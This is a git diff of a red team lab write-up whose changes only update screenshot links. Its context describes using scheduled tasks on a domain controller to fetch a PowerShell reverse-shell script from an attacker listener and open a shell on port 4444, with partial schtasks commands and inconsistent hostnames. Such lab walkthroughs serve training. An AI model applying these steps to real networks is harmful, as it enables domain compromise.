@@ -515,7 +515,7 @@ Now we are creating a powershell TCP that would connect back to our attacking ma
 
 ## Invoke-PowerShellTcpOneLine.ps1
 
-![Screenshot 2023-07-08 at 10 28 08 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/12f28ff0-e0ab-4c1b-9a4a-f43d395c0952)
+![Screenshot 2023-07-08 at 10 28 08 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/e91a12d8-111e-41fc-89f4-e8d73c93f724)
 
 With all the information we gathered. From the compromised child-admin system, we schedule a task that will run on the domain controller. This task will initiate a download script of the copy of the Invoke-PowerShellTcpOneLine.ps1 running in our listener at port 80 of our attacking machine. The powershell script will spawn a shell on our attacking machine listening on port 4444.
 
@@ -526,7 +526,7 @@ schtasks /create /S RED-CHILDDC.child.redteam.corp /SC Weekly /RU "NT Authority\
 
 The schedule task is successful with task name “silver1”
 
-![Screenshot 2023-07-08 at 10 40 10 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/c517f50e-50ec-49ec-abb9-be388af02941)
+![Screenshot 2023-07-08 at 10 40 10 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/3ca9a289-8dca-434c-8486-cf12c277b01a)
 
 ```bash
 #this will transfer the Invoke-PowerShellTcpOneLine.ps1
@@ -541,7 +541,7 @@ schtasks /Run /S windows-sevrer.warfare.corp /TN "silver1"
 
 Listening at port 80 where our Invoke-PowerShellTcpOneLine.ps1 is stored
 
-![Screenshot 2023-07-08 at 10 43 10 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/75756982-21e2-4031-9fd7-6a4c1941e97a)
+![Screenshot 2023-07-08 at 10 43 10 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/4de3f90d-6c95-40ab-af12-518794de4eca)
 
 Initiating the task from the child-admin machine.
 
@@ -551,11 +551,11 @@ schtasks /Run /S RED-CILDDC.child.redteam.corp /TN "silver1"
 
 Task is successful
 
-![Screenshot 2023-07-08 at 10 43 26 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/f0aead82-bd59-4782-97e7-0fe617e1704f)
+![Screenshot 2023-07-08 at 10 43 26 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/cf1e26e1-1943-4abe-b51c-2795c8972726)
 
 In our listening port 4444, a shell has been spawned. Do the enumeration and we validated that this spawned shell is the domain controller itself running on IP address 10.10.10.2 with the hostname RED-CHILDDC
 
-![Screenshot 2023-07-08 at 10 44 01 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/bc1e0e2e-201e-4502-955e-b59236b9511e)
+![Screenshot 2023-07-08 at 10 44 01 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/afed6da9-59e9-48c0-8310-e8b1dec690c1)
 
 Now we completed our enumeration as follows.
 
